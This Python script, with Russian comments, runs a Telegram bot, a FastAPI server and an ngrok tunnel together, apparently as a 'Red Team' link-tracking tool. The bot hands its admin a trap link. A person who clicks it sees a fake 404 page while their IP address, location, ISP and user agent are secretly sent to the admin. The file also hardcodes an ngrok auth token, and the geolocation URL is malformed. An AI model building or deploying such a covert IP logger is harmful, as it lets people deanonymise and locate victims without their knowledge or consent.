import os
import sys
import asyncio
import uvicorn
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from dotenv import load_dotenv
from pyngrok import ngrok  

load_dotenv()
API_TOKEN = os.getenv("LINK_BOT_TOKEN")

if not API_TOKEN:
    print("[❌ СТОП] Робот не нашел переменную LINK_BOT_TOKEN в файле .env!")
    sys.exit(1)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
app = FastAPI()

# 🕶️ ХАРДКОРНАЯ КБ-ЗАЩИТА: ТВОЙ ID ЗАШИТ НАМЕРТВО!
ADMIN_ID = 8547599215 
PUBLIC_URL = None 

print("\n" + "="*60)
print("[🕶️ RED TEAM COMPILER] Запуск КБ-комбайна на движке Ngrok...")
print("="*60 + "\n")

# --- 1. ВЕБ-СЕРВЕР ДЛЯ СБОРА ДАННЫХ ---
@app.get("/target", response_class=HTMLResponse)
async def handle_click(request: Request):
    global ADMIN_ID
    
    user_ip = request.client.host
    user_agent = request.headers.get("user-agent", "Неизвестно")
    country, city, isp = "Запрос обрабатывается", "Запрос обрабатывается", "Запрос обрабатывается"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com{user_ip}") as response:
                data = await response.json()
                if data.get("status") == "success":
                    country = data.get("country", "Неизвестно")
                    city = data.get("city", "Неизвестно")
                    isp = data.get("isp", "Неизвестно")
    except Exception:
        pass

    report_text = (
        f"🎯 [🚨 СРАБОТАЛ ПЕРЕХВАТ ССЫЛКИ!]\n\n"
        f"🌐 **IP-Адрес цели:** `{user_ip}`\n"
        f"📍 **Локация:** {country}, {city}\n"
        f"🏢 **Провайдер:** `{isp}`\n"
        f"📱 **Устройство:** `{user_agent[:100]}`"
    )

    print(f"\n[🔥 ПЕРЕХВАТ] Сетевой пакет пойман! IP: {user_ip}")
    
    if ADMIN_ID:
        try:
            await bot.send_message(chat_id=ADMIN_ID, text=report_text, parse_mode="Markdown")
        except Exception as e:
            print(f"[❌] Ошибка отправки сообщения админу: {e}")

    return """
    <html>
        <head><title>404 Not Found</title></head>
        <body style="background-color: #111; color: #aaa; font-family: sans-serif; text-align: center; padding-top: 100px;">
            <h3>Ошибка 404: Страница временно недоступна</h3>
            <p style="font-size: 14px; color: #555;">Попробуйте обновить подключение позже.</p>
        </body>
    </html>
    """

# --- 2. ЛОГИКА УПРАВЛЕНИЯ ЧЕРЕЗ ТЕЛЕГРАМ ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("🔒 Ошибка доступа. У вас нет прав для взаимодействия с этой КБ-панелью.")
        return

    await message.answer(
        "🕶️ **Добро пожаловать в Локальный Red Team Центр!**\n\n"
        "Система на движке Ngrok запущена. ID проверен в коде.\n\n"
        "📜 **Команды:**\n"
        "🔹 `/link` — Сгенерировать глобальную интернет-ссылку ловушку"
    )

@dp.message(Command("link"))
async def cmd_get_link(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    global PUBLIC_URL
    if not PUBLIC_URL:
        await message.answer("⏳ Сетевой туннель еще регистрируется, подожди 5 секунд...")
        return
        
    global_link = f"{PUBLIC_URL}/target"
    
    await message.answer(
        f"🔗 **Глобальная ссылка-ловушка готова:**\n\n"
        f"`{global_link}`\n\n"
        f"⚠️ *Она работает по всему миру. При клике выскочит Ошибка 404, а тебе прилетит скрытый IP-отчет.*"
    )

# --- 3. АСИНХРОННЫЙ ЗАПУСК СЕРВЕРОВ ---
async def start_bot():
    await bot.delete_webhook(drop_pending_updates=True)
    print("[Бот] Успешно запущен!")
    await dp.start_polling(bot)

async def start_server():
    config = uvicorn.Config(app, host="127.0.0.1", port=8000, log_level="warning")
    server = uvicorn.Server(config)
    print("[Сервер FastAPI] Развернут на локальном порту 8000")
    await server.serve()

async def start_tunnel():
    """Магия авто-регистрации сайта через Ngrok с ХАРДКОД-авторизацией"""
    global PUBLIC_URL
    await asyncio.sleep(2) 
    
    # Твой токен зашит намертво для обхода ошибок
    my_secure_token = "3JpxvoNGqV9LPvObuD0FeDVRvjs_4LEzz7NxstWoL8GkSd9Jx"
    
    try:
        ngrok.set_auth_token(my_secure_token)
        tunnel = ngrok.connect(8000)
        PUBLIC_URL = tunnel.public_url.replace("http://", "https://")
        
        print(f"\n⚡ [СЕТЕВАЯ МАГИЯ] Глобальный сайт успешно зарегистрирован в интернете!")
        print(f"🌐 Мировой адрес твоего сервера: {PUBLIC_URL}\n")
        
    except Exception as e:
        print(f"[❌ ОШИБКА СЕТИ] Не удалось поднять туннель: {e}")

async def main():
    await asyncio.gather(start_server(), start_bot(), start_tunnel())

if __name__ == "__main__":
    asyncio.run(main())
